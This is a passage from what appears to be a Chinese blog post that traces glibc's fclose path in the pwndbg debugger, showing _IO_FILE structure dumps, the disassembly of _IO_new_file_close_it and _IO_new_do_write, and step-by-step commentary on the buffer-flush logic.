&quot;&quot;,</span><br><span class="line">    _lock = 0x7ffff7e1ca60 &lt;_IO_stdfile_2_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7e1a8a0 &lt;_IO_wide_data_2&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$3 = (struct _IO_FILE_plus *) 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure><p>已经变回了<code>_IO_2_1_stderr_</code><br>我们再看我们要关闭的结构体<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$4 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537084,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594d0 &quot;&quot;,</span><br><span class="line">    _IO_write_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其<code>_chain</code>域仍然指向<code>_IO_2_1_stderr_</code>，只是将<code>_IO_list_all</code>指针指向了<code>_IO_2_1_stderr_</code><br>再往下走，接着经过一些检查后就是调用<code>_IO_file_close_it</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ed87 &lt;fclose+279&gt;    mov    rdi, rbp        RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c7ed8a &lt;fclose+282&gt;    call   _IO_file_close_it           &lt;_IO_file_close_it&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_file_close_it:</span><br><span class="line">=&gt; 0x00007ffff7c8be90 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8be94 &lt;+4&gt;:     push   r12</span><br><span class="line">   0x00007ffff7c8be96 &lt;+6&gt;:     push   rbp</span><br><span class="line">   0x00007ffff7c8be97 &lt;+7&gt;:     push   rbx</span><br><span class="line">   0x00007ffff7c8be98 &lt;+8&gt;:     mov    r12d,DWORD PTR [rdi+0x70]</span><br><span class="line">   0x00007ffff7c8be9c &lt;+12&gt;:    cmp    r12d,0xffffffff</span><br><span class="line">   0x00007ffff7c8bea0 &lt;+16&gt;:    je     0x7ffff7c8bf8c &lt;_IO_new_file_close_it+252&gt;</span><br><span class="line">   0x00007ffff7c8bea6 &lt;+22&gt;:    mov    eax,DWORD PTR [rdi]</span><br><span class="line">   0x00007ffff7c8bea8 &lt;+24&gt;:    mov    rbx,rdi</span><br><span class="line">   0x00007ffff7c8beab &lt;+27&gt;:    xor    ebp,ebp</span><br><span class="line">   0x00007ffff7c8bead &lt;+29&gt;:    and    eax,0x808</span><br><span class="line">   0x00007ffff7c8beb2 &lt;+34&gt;:    cmp    eax,0x800</span><br><span class="line">   0x00007ffff7c8beb7 &lt;+39&gt;:    je     0x7ffff7c8bf98 &lt;_IO_new_file_close_it+264&gt;</span><br><span class="line">   0x00007ffff7c8bebd &lt;+45&gt;:    mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8bec0 &lt;+48&gt;:    xor    r12d,r12d</span><br><span class="line">   0x00007ffff7c8bec3 &lt;+51&gt;:    call   0x7ffff7c8f230 &lt;__GI__IO_unsave_markers&gt;</span><br><span class="line">   0x00007ffff7c8bec8 &lt;+56&gt;:    test   BYTE PTR [rbx+0x74],0x20</span><br><span class="line">   0x00007ffff7c8becc &lt;+60&gt;:    jne    0x7ffff7c8bf03 &lt;_IO_new_file_close_it+115&gt;</span><br><span class="line">   0x00007ffff7c8bece &lt;+62&gt;:    mov    r12,QWORD PTR [rbx+0xd8]</span><br><span class="line">   0x00007ffff7c8bed5 &lt;+69&gt;:    lea    rdx,[rip+0x18ab24]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8bedc &lt;+76&gt;:    lea    rax,[rip+0x18b885]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8bee3 &lt;+83&gt;:    sub    rax,rdx</span><br><span class="line">   0x00007ffff7c8bee6 &lt;+86&gt;:    mov    rcx,r12</span><br><span class="line">   0x00007ffff7c8bee9 &lt;+89&gt;:    sub    rcx,rdx</span><br><span class="line">   0x00007ffff7c8beec &lt;+92&gt;:    cmp    rax,rcx</span><br><span class="line">   0x00007ffff7c8beef &lt;+95&gt;:    jbe    0x7ffff7c8bfe0 &lt;_IO_new_file_close_it+336&gt;</span><br><span class="line">   0x00007ffff7c8bef5 &lt;+101&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8bef8 &lt;+104&gt;:   call   QWORD PTR [r12+0x88]</span><br><span class="line">   0x00007ffff7c8bf00 &lt;+112&gt;:   mov    r12d,eax</span><br><span class="line">   0x00007ffff7c8bf03 &lt;+115&gt;:   mov    eax,DWORD PTR [rbx+0xc0]</span><br><span class="line">   0x00007ffff7c8bf09 &lt;+121&gt;:   test   eax,eax</span><br><span class="line">   0x00007ffff7c8bf0b &lt;+123&gt;:   jle    0x7ffff7c8bf47 &lt;_IO_new_file_close_it+183&gt;</span><br><span class="line">   0x00007ffff7c8bf0d &lt;+125&gt;:   mov    rax,QWORD PTR [rbx+0xa0]</span><br><span class="line">   0x00007ffff7c8bf14 &lt;+132&gt;:   cmp    QWORD PTR [rax+0x40],0x0</span><br><span class="line">   0x00007ffff7c8bf19 &lt;+137&gt;:   je     0x7ffff7c8bf23 &lt;_IO_new_file_close_it+147&gt;</span><br><span class="line">   0x00007ffff7c8bf1b &lt;+139&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8bf1e &lt;+142&gt;:   call   0x7ffff7c84340 &lt;__GI__IO_free_wbackup_area&gt;</span><br><span class="line">   0x00007ffff7c8bf23 &lt;+147&gt;:   xor    ecx,ecx</span><br><span class="line">   0x00007ffff7c8bf25 &lt;+149&gt;:   xor    edx,edx</span><br><span class="line">   0x00007ffff7c8bf27 &lt;+151&gt;:   xor    esi,esi</span><br><span class="line">   0x00007ffff7c8bf29 &lt;+153&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8bf2c &lt;+156&gt;:   call   0x7ffff7c83590 &lt;__GI__IO_wsetb&gt;</span><br><span class="line">   0x00007ffff7c8bf31 &lt;+161&gt;:   mov    rax,QWORD PTR [rbx+0xa0]</span><br><span class="line">   0x00007ffff7c8bf38 &lt;+168&gt;:   pxor   xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8bf3c &lt;+172&gt;:   movups XMMWORD PTR [rax],xmm0</span><br><span class="line">   0x00007ffff7c8bf3f &lt;+175&gt;:   movups XMMWORD PTR [rax+0x10],xmm0</span><br><span class="line">   0x00007ffff7c8bf43 &lt;+179&gt;:   movups XMMWORD PTR [rax+0x20],xmm0</span><br><span class="line">   0x00007ffff7c8bf47 &lt;+183&gt;:   xor    ecx,ecx</span><br><span class="line">   0x00007ffff7c8bf49 &lt;+185&gt;:   xor    edx,edx</span><br><span class="line">   0x00007ffff7c8bf4b &lt;+187&gt;:   xor    esi,esi</span><br><span class="line">   0x00007ffff7c8bf4d &lt;+189&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8bf50 &lt;+192&gt;:   call   0x7ffff7c8dc20 &lt;__GI__IO_setb&gt;</span><br><span class="line">   0x00007ffff7c8bf55 &lt;+197&gt;:   pxor   xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8bf59 &lt;+201&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8bf5c &lt;+204&gt;:   movups XMMWORD PTR [rbx+0x8],xmm0</span><br><span class="line">   0x00007ffff7c8bf60 &lt;+208&gt;:   movups XMMWORD PTR [rbx+0x18],xmm0</span><br><span class="line">   0x00007ffff7c8bf64 &lt;+212&gt;:   movups XMMWORD PTR [rbx+0x28],xmm0</span><br><span class="line">   0x00007ffff7c8bf68 &lt;+216&gt;:   call   0x7ffff7c8d2b0 &lt;__GI__IO_un_link&gt;</span><br><span class="line">   0x00007ffff7c8bf6d &lt;+221&gt;:   test   r12d,r12d</span><br><span class="line">   0x00007ffff7c8bf70 &lt;+224&gt;:   mov    DWORD PTR [rbx],0xfbad240c</span><br><span class="line">   0x00007ffff7c8bf76 &lt;+230&gt;:   mov    DWORD PTR [rbx+0x70],0xffffffff</span><br><span class="line">   0x00007ffff7c8bf7d &lt;+237&gt;:   cmove  r12d,ebp</span><br><span class="line">   0x00007ffff7c8bf81 &lt;+241&gt;:   mov    QWORD PTR [rbx+0x90],0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8bf8c &lt;+252&gt;:   mov    eax,r12d</span><br><span class="line">   0x00007ffff7c8bf8f &lt;+255&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8bf90 &lt;+256&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8bf91 &lt;+257&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8bf93 &lt;+259&gt;:   ret</span><br><span class="line">   0x00007ffff7c8bf94 &lt;+260&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8bf98 &lt;+264&gt;:   mov    edx,DWORD PTR [rdi+0xc0]</span><br><span class="line">   0x00007ffff7c8bf9e &lt;+270&gt;:   test   edx,edx</span><br><span class="line">   0x00007ffff7c8bfa0 &lt;+272&gt;:   jle    0x7ffff7c8bfc8 &lt;_IO_new_file_close_it+312&gt;</span><br><span class="line">   0x00007ffff7c8bfa2 &lt;+274&gt;:   mov    rax,QWORD PTR [rdi+0xa0]</span><br><span class="line">   0x00007ffff7c8bfa9 &lt;+281&gt;:   mov    rsi,QWORD PTR [rax+0x18]</span><br><span class="line">   0x00007ffff7c8bfad &lt;+285&gt;:   mov    rdx,QWORD PTR [rax+0x20]</span><br><span class="line">   0x00007ffff7c8bfb1 &lt;+289&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8bfb4 &lt;+292&gt;:   sar    rdx,0x2</span><br><span class="line">   0x00007ffff7c8bfb8 &lt;+296&gt;:   call   0x7ffff7c861a0 &lt;__GI__IO_wdo_write&gt;</span><br><span class="line">   0x00007ffff7c8bfbd &lt;+301&gt;:   mov    ebp,eax</span><br><span class="line">   0x00007ffff7c8bfbf &lt;+303&gt;:   jmp    0x7ffff7c8bebd &lt;_IO_new_file_close_it+45&gt;</span><br><span class="line">   0x00007ffff7c8bfc4 &lt;+308&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8bfc8 &lt;+312&gt;:   mov    rsi,QWORD PTR [rdi+0x20]</span><br><span class="line">   0x00007ffff7c8bfcc &lt;+316&gt;:   mov    rdx,QWORD PTR [rdi+0x28]</span><br><span class="line">   0x00007ffff7c8bfd0 &lt;+320&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8bfd3 &lt;+323&gt;:   call   0x7ffff7c8c930 &lt;_IO_new_do_write&gt;</span><br><span class="line">   0x00007ffff7c8bfd8 &lt;+328&gt;:   mov    ebp,eax</span><br><span class="line">   0x00007ffff7c8bfda &lt;+330&gt;:   jmp    0x7ffff7c8bebd &lt;_IO_new_file_close_it+45&gt;</span><br><span class="line">   0x00007ffff7c8bfdf &lt;+335&gt;:   nop</span><br><span class="line">   0x00007ffff7c8bfe0 &lt;+336&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8bfe5 &lt;+341&gt;:   jmp    0x7ffff7c8bef5 &lt;_IO_new_file_close_it+101&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>我们接着走<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8be90 &lt;_IO_file_close_it&gt;       endbr64</span><br><span class="line">0x7ffff7c8be94 &lt;_IO_file_close_it+4&gt;     push   r12</span><br><span class="line">0x7ffff7c8be96 &lt;_IO_file_close_it+6&gt;     push   rbp</span><br><span class="line">0x7ffff7c8be97 &lt;_IO_file_close_it+7&gt;     push   rbx</span><br><span class="line">0x7ffff7c8be98 &lt;_IO_file_close_it+8&gt;     mov    r12d, dword ptr [rdi + 0x70]     R12D, [0x555555559310] =&gt; 3</span><br><span class="line">0x7ffff7c8be9c &lt;_IO_file_close_it+12&gt;    cmp    r12d, -1                         3 - -1     EFLAGS =&gt; 0x213 [ CF pf AF zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8bea0 &lt;_IO_file_close_it+16&gt;  ✘ je     _IO_file_close_it+252       &lt;_IO_file_close_it+252&gt;</span><br></pre></td></tr></table></figure><p>这里是判断文件处于打开状态，直接比较<code>_fileno</code>域，确保不是-1<br>否则直接返回<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c8bf8c &lt;+252&gt;:   mov    eax,r12d</span><br><span class="line">0x00007ffff7c8bf8f &lt;+255&gt;:   pop    rbx</span><br><span class="line">0x00007ffff7c8bf90 &lt;+256&gt;:   pop    rbp</span><br><span class="line">0x00007ffff7c8bf91 &lt;+257&gt;:   pop    r12</span><br><span class="line">0x00007ffff7c8bf93 &lt;+259&gt;:   ret</span><br></pre></td></tr></table></figure><p>接着判断是不是输出缓冲区<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bea6 &lt;_IO_file_close_it+22&gt;     mov    eax, dword ptr [rdi]             EAX, [0x5555555592a0] =&gt; 0xfbad2c04</span><br><span class="line">0x7ffff7c8bea8 &lt;_IO_file_close_it+24&gt;     mov    rbx, rdi                         RBX =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c8beab &lt;_IO_file_close_it+27&gt;     xor    ebp, ebp                         EBP =&gt; 0</span><br><span class="line">0x7ffff7c8bead &lt;_IO_file_close_it+29&gt;     and    eax, 0x808                       EAX =&gt; 0x800 (0xfbad2c04 &amp; 0x808)</span><br><span class="line">0x7ffff7c8beb2 &lt;_IO_file_close_it+34&gt;     cmp    eax, 0x800                       0x800 - 0x800     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8beb7 &lt;_IO_file_close_it+39&gt;   ✔ je     _IO_file_close_it+264       &lt;_IO_file_close_it+264&gt;</span><br></pre></td></tr></table></figure><p>如果是的话（我们这里是），则调用<code>_IO_do_flush</code>刷新此时的输出缓冲区，<code>_IO_do_flush</code>也是一个宏定义<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line"># define _IO_do_flush(_f) \</span><br><span class="line">  ((_f)-&gt;_mode &lt;= 0                               \</span><br><span class="line">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                   \</span><br><span class="line">          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)           \</span><br><span class="line">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \</span><br><span class="line">           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr               \</span><br><span class="line">            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span><br></pre></td></tr></table></figure><p>可以看到它对应的是调用<code>_IO_do_write</code>函数去输出此时的输出缓冲区<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bf98 &lt;_IO_file_close_it+264&gt;    mov    edx, dword ptr [rdi + 0xc0]     EDX, [0x555555559360] =&gt; 0xffffffff</span><br><span class="line">0x7ffff7c8bf9e &lt;_IO_file_close_it+270&gt;    test   edx, edx                        0xffffffff &amp; 0xffffffff     EFLAGS =&gt; 0x286 [ cf PF af zf SF IF df of ac ]</span><br><span class="line">0x7ffff7c8bfa0 &lt;_IO_file_close_it+272&gt;  ✔ jle    _IO_file_close_it+312       &lt;_IO_file_close_it+312&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8bfc8 &lt;_IO_file_close_it+312&gt;    mov    rsi, qword ptr [rdi + 0x20]     RSI, [0x5555555592c0] =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8bfcc &lt;_IO_file_close_it+316&gt;    mov    rdx, qword ptr [rdi + 0x28]     RDX, [0x5555555592c8] =&gt; 0x5555555594d0 ◂— 0</span><br><span class="line">0x7ffff7c8bfd0 &lt;_IO_file_close_it+320&gt;    sub    rdx, rsi                        RDX =&gt; 32 (0x5555555594d0 - 0x5555555594b0)</span><br><span class="line">0x00007ffff7c8bfd3 &lt;+323&gt;:   call   0x7ffff7c8c930 &lt;_IO_new_do_write&gt;</span><br></pre></td></tr></table></figure><p>放上反汇编结果方便分析<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_do_write:</span><br><span class="line">   0x00007ffff7c8c930 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8c934 &lt;+4&gt;:     xor    eax,eax</span><br><span class="line">   0x00007ffff7c8c936 &lt;+6&gt;:     test   rdx,rdx</span><br><span class="line">   0x00007ffff7c8c939 &lt;+9&gt;:     jne    0x7ffff7c8c940 &lt;_IO_new_do_write+16&gt;</span><br><span class="line">   0x00007ffff7c8c93b &lt;+11&gt;:    ret</span><br><span class="line">   0x00007ffff7c8c93c &lt;+12&gt;:    nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8c940 &lt;+16&gt;:    push   r15</span><br><span class="line">   0x00007ffff7c8c942 &lt;+18&gt;:    lea    r15,[rip+0x18a0b7]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8c949 &lt;+25&gt;:    push   r14</span><br><span class="line">   0x00007ffff7c8c94b &lt;+27&gt;:    push   r13</span><br><span class="line">   0x00007ffff7c8c94d &lt;+29&gt;:    lea    r13,[rip+0x18ae14]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8c954 &lt;+36&gt;:    push   r12</span><br><span class="line">   0x00007ffff7c8c956 &lt;+38&gt;:    sub    r13,r15</span><br><span class="line">   0x00007ffff7c8c959 &lt;+41&gt;:    mov    r12,rsi</span><br><span class="line">   0x00007ffff7c8c95c &lt;+44&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c8c95d &lt;+45&gt;:    mov    rbp,rdx</span><br><span class="line">   0x00007ffff7c8c960 &lt;+48&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8c961 &lt;+49&gt;:    mov    rbx,rdi</span><br><span class="line">   0x00007ffff7c8c964 &lt;+52&gt;:    sub    rsp,0x8</span><br><span class="line">   0x00007ffff7c8c968 &lt;+56&gt;:    mov    r14,QWORD PTR [rdi+0xd8]</span><br><span class="line">   0x00007ffff7c8c96f &lt;+63&gt;:    test   DWORD PTR [rdi],0x1000</span><br><span class="line">   0x00007ffff7c8c975 &lt;+69&gt;:    jne    0x7ffff7c8ca40 &lt;_IO_new_do_write+272&gt;</span><br><span class="line">   0x00007ffff7c8c97b &lt;+75&gt;:    mov    rax,QWORD PTR [rdi+0x10]</span><br><span class="line">   0x00007ffff7c8c97f &lt;+79&gt;:    mov    rsi,QWORD PTR [rdi+0x20]</span><br><span class="line">   0x00007ffff7c8c983 &lt;+83&gt;:    cmp    rax,rsi</span><br><span class="line">   0x00007ffff7c8c986 &lt;+86&gt;:    je     0x7ffff7c8c9c5 &lt;_IO_new_do_write+149&gt;</span><br><span class="line">   0x00007ffff7c8c988 &lt;+88&gt;:    mov    rdx,r14</span><br><span class="line">   0x00007ffff7c8c98b &lt;+91&gt;:    sub    rdx,r15</span><br><span class="line">   0x00007ffff7c8c98e &lt;+94&gt;:    cmp    r13,rdx</span><br><span class="line">   0x00007ffff7c8c991 &lt;+97&gt;:    jbe    0x7ffff7c8ca90 &lt;_IO_new_do_write+352&gt;</span><br><span class="line">   0x00007ffff7c8c997 &lt;+103&gt;:   mov    edx,0x1</span><br><span class="line">   0x00007ffff7c8c99c &lt;+108&gt;:   sub    rsi,rax</span><br><span class="line">   0x00007ffff7c8c99f &lt;+111&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8c9a2 &lt;+114&gt;:   call   QWORD PTR [r14+0x80]</span><br><span class="line">   0x00007ffff7c8c9a9 &lt;+121&gt;:   mov    rdx,rax</span><br><span class="line">   0x00007ffff7c8c9ac &lt;+124&gt;:   mov    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8c9b1 &lt;+129&gt;:   cmp    rdx,0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8c9b5 &lt;+133&gt;:   je     0x7ffff7c8ca2a &lt;_IO_new_do_write+250&gt;</span><br><span class="line">   0x00007ffff7c8c9b7 &lt;+135&gt;:   mov    QWORD PTR [rbx+0x90],rdx</span><br><span class="line">   0x00007ffff7c8c9be &lt;+142&gt;:   mov    r14,QWORD PTR [rbx+0xd8]</span><br><span class="line">   0x00007ffff7c8c9c5 &lt;+149&gt;:   mov    rax,r14</span><br><span class="line">   0x00007ffff7c8c9c8 &lt;+152&gt;:   sub    rax,r15</span><br><span class="line">   0x00007ffff7c8c9cb &lt;+155&gt;:   cmp    